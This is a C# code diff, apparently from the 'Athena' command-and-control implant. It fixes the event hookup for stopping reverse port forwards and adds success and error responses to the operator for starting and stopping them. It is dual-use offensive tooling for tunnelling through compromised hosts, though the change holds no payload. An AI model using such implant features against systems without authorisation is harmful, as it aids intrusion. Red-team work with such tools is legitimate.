@@ -47,18 +47,67 @@ namespace Athena
             this.commandHandler.ListForwarders += ListForwarders;
             this.commandHandler.ListProfiles += ListProfiles;
             this.commandHandler.StartRportFwd += StartRportFwd;
-            this.commandHandler.StopForwarder += StopRportFwd;
+            this.commandHandler.StopRportFwd += StopRportFwd;
         }
 
         private void StopRportFwd(object sender, TaskEventArgs e)
         {
             var dict = Misc.ConvertJsonStringToDict(e.job.task.parameters);
-            this.rportfwdHandler.StopListener(int.Parse(dict["lport"]));
+            if (this.rportfwdHandler.StopListener(int.Parse(dict["lport"])).Result)
+            {
+                TaskResponseHandler.AddResponse(new ResponseResult()
+                {
+                    task_id = e.job.task.id,
+                    completed = true,
+                    process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x39" }
+                    }
+
+                });
+                return;
+            }
+
+            TaskResponseHandler.AddResponse(new ResponseResult()
+            {
+                task_id = e.job.task.id,
+                completed = true,
+                process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x40" }
+                    },
+                status = "error"
+
+            });
         }
 
         private void StartRportFwd(object sender, TaskEventArgs e)
         {
-            this.rportfwdHandler.StartListener(e.job);
+            if (this.rportfwdHandler.StartListener(e.job).Result)
+            {
+                TaskResponseHandler.AddResponse(new ResponseResult()
+                {
+                    task_id = e.job.task.id,
+                    completed = true,
+                    process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x41" }
+                    }
+
+                });
+                return;
+            }
+            TaskResponseHandler.AddResponse(new ResponseResult()
+            {
+                task_id = e.job.task.id,
+                completed = true,
+                process_response = new Dictionary<string, string>()
+                    {
+                        { "message", "0x42" }
+                    },
+                status = "error"
+
+            });
 
         }
 
